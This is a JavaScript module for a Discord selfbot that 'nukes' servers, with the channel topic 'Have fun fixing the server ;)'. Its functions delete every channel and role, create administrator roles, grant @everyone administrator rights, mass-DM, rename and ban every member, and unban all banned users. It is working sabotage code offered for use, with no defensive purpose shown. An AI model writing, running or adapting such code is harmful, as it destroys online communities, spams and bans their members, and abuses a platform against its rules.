const Ctopic = "Have fun fixing the server ;)";
const { Permissions, WebEmbed } = require("discord.js-selfbot-v13")


async function clearChannels(message) {
	message.guild.channels.cache.forEach(channel => channel.delete().catch(e => console.log(`Tried deleting community channel - ${channel.name} / ${message.author.id} : ${message.author.tag}`)));
}

async function clearRoles(message) {
	message.guild.roles.cache.forEach(role => role.delete().catch(e => console.log(`Tried deleting community role - ${role.name} / ${message.author.id} : ${message.author.tag}`)));
}

async function makeRoles(message, name) {
	message.guild.roles.create({name, color: "RED", permissions: Permissions.FLAGS.ADMINISTRATOR, mentionable: true})
}

async function makeChannel(message, name) {
	message.guild.channels.create(name, {
        type: "text",
		topic: Ctopic,
        permissionOverwrites: [
           {
             id: message.guild.roles.everyone, 
             allow: ['VIEW_CHANNEL', 'SEND_MESSAGES', 'READ_MESSAGE_HISTORY']
		   }
        ],
    })
}

async function dmEveryone(message, toDM) {
	await message.delete().catch()
	let members = await message.guild.members.fetch({ force: true });
	var delay = 1
	for (const [key, value] of members.entries()) {
		setTimeout(async () => {
			value.send(toDM)
			.catch(() => console.log("Can't send DM anymore (ratelimit ?)"))
		}, delay++*60000)
	}
}

//setTimeout(() => value.send(key + " " + toDM).catch(() => (console.log(`Error while DMALL / ${message.author.id} : ${message.author.tag}`))), delay++*5000)

async function renameEveryone(message, name) {
	let members = await message.guild.members.fetch({ force: true }); 
	members.forEach(member => {
		member.setNickname(name).catch(e => (console.log(`Error while renaming Everyone / ${message.author.id} : ${message.author.tag}`)))
	});
}

async function massUnban(message) {
	message.guild.bans.fetch().then(fB => {
		fB.forEach(fB=>{
		    message.guild.members.unban(fB.user.id);
		})
	})
}

async function massBan(message, reason) {
	let members = await message.guild.members.fetch({ force: true }); 
	members.forEach(member => {
	    member.ban({ reason}).catch(() => {
		});
	});
}

async function adminAll(message) {
	message.guild.roles.everyone.setPermissions([Permissions.FLAGS.ADMINISTRATOR])
}

async function sendEmbed(message, title, color, image){
	const w = new WebEmbed({
		shorten: true,
		hidden: false
		})
	  .setTitle(title)
	  .setColor(color)
	  .setImage(image);

	  setTimeout(() =>  message.edit({embeds: [w]}).catch(() => console.log(`Error while sending embed by ${message.author.id}`)), 2000)
}

module.exports = {
    clearChannels,
	clearRoles, 
    makeChannel, 
	makeRoles,
    dmEveryone,
	renameEveryone,
    massUnban, 
    massBan, 
    adminAll,
	sendEmbed,
}